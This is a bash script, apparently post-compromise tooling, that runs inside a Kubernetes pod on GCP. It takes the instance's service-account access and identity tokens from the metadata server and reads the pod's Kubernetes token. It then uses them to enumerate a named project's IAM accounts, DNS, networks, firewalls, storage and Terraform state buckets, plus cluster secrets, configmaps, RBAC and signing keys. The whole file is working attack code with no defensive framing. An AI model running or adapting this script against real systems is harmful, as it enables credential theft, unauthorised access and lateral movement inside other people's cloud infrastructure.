#!/bin/bash
echo "=== V7: GCP + K8S SENSITIVE DATA DEEP DIVE ==="
date -u; hostname
MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
TOKEN=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
MYHOST=$(hostname)

echo "=== 1. GCP: SERVICE USAGE (enabled APIs) ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://serviceusage.googleapis.com/v1/projects/yextenv-sbx/services?filter=state:ENABLED&pageSize=50" 2>&1 | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    if 'services' in d:
        for s in d['services']:
            print(s.get('config',{}).get('name','?'))
    else:
        print(json.dumps(d)[:2000])
except: print(sys.stdin.read()[:2000])
" 2>&1; echo

echo "=== 2. GCP: SA IDENTITY TOKEN ==="
curl -s -m 8 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://kubernetes.default.svc&format=full" 2>&1 | head -c 2000; echo
echo "-- decode JWT header+claims --"
curl -s -m 8 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://kubernetes.default.svc&format=full" 2>&1 | python3 -c "
import sys,base64,json
tok=sys.stdin.read().strip()
parts=tok.split('.')
if len(parts)>=2:
    for i in range(2):
        pad=parts[i]+'='*(-len(parts[i])%4)
        try:
            d=json.loads(base64.urlsafe_b64decode(pad))
            print(json.dumps(d,indent=2))
        except: print(parts[i][:100])
else:
    print(tok[:200])
" 2>&1

echo "=== 3. GCP: COMPUTE PROJECT ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx" 2>&1 | head -c 3000; echo

echo "=== 4. GCP: IAM SA INFO ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://iam.googleapis.com/v1/projects/yextenv-sbx/serviceAccounts" 2>&1 | head -c 2000; echo
echo "-- get own SA --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://iam.googleapis.com/v1/projects/-/serviceAccounts/yextenv-sbx.svc.id.goog" 2>&1 | head -c 1000; echo

echo "=== 5. GCP: CLOUD DNS ZONES ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://dns.googleapis.com/dns/v1/projects/yextenv-sbx/managedZones" 2>&1 | head -c 2000; echo

echo "=== 6. GCP: VPC NETWORKS ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx/global/networks" 2>&1 | head -c 2000; echo
echo "-- firewalls --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx/global/firewalls?maxResults=5" 2>&1 | head -c 2000; echo

echo "=== 7. GCP: CONTAINER ANALYSIS ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://containeranalysis.googleapis.com/v1/projects/yextenv-sbx/notes?pageSize=5" 2>&1 | head -c 1500; echo
echo "-- vulnerabilities --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://containeranalysis.googleapis.com/v1/projects/yextenv-sbx/occurrences?pageSize=5" 2>&1 | head -c 1500; echo

echo "=== 8. GCP: GCS SPECIFIC OBJECTS ==="
for path in "gs://artifacts.yextenv-sbx.appspot.com" "gs://us.artifacts.yextenv-sbx.appspot.com"; do
  bucket=$(echo $path | sed 's|gs://||')
  curl -s -m 5 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket" 2>&1 | head -c 1000; echo
done
echo "-- terraform state --"
for bucket in yextenv-sbx-tfstate yextenv-sbx-terraform-state terraform-yextenv-sbx; do
  R=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket")
  echo "$bucket -> $R"
done

echo "=== 9. K8S: KUBE-PUBLIC CLUSTER-INFO ==="
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/kube-public/configmaps/cluster-info" 2>&1 | head -c 3000; echo

echo "=== 10. K8S: OIDC/JWKS ==="
echo "-- openid-configuration --"
curl -sk -m 5 "https://kubernetes.default.svc/.well-known/openid-configuration" 2>&1 | head -c 1000; echo
echo "-- JWKS signing keys --"
curl -sk -m 5 "https://kubernetes.default.svc/openid/v1/jwks" 2>&1 | head -c 2000; echo

echo "=== 11. K8S: OWN POD ==="
echo "-- get own pod by name --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods/$MYHOST" 2>&1 | head -c 3000; echo

echo "=== 12. K8S: KUBE-SYSTEM ==="
echo "-- configmaps --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/kube-system/configmaps?limit=5" 2>&1 | head -c 2000; echo
echo "-- secrets --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets?limit=3" 2>&1 | head -c 1500; echo

echo "=== 13. K8S: TOKEN REVIEW ==="
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authentication.k8s.io/v1/tokenreviews" -d "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenReview\",\"spec\":{\"token\":\"$K8S\"}}" 2>&1 | head -c 2000; echo

echo "=== 14. K8S: CRDs ==="
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/apis/apiextensions.k8s.io/v1/customresourcedefinitions?limit=10" 2>&1 | head -c 3000; echo

echo "=== 15. K8S: RBAC ==="
echo "-- clusterroles --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles?limit=5" 2>&1 | head -c 2000; echo
echo "-- rolebindings in ns --"
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/namespaces/$NS/rolebindings" 2>&1 | head -c 2000; echo

echo "=== 16. K8S: HEALTHZ VERBOSE ==="
curl -sk -m 5 "https://kubernetes.default.svc/healthz?verbose" 2>&1 | head -c 2000; echo
curl -sk -m 5 "https://kubernetes.default.svc/livez?verbose" 2>&1 | head -c 1000; echo

echo "=== 17. K8S: OPENAPI ==="
curl -s -m 5 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/openapi/v3" 2>&1 | head -c 2000; echo

echo "=== DONE ==="
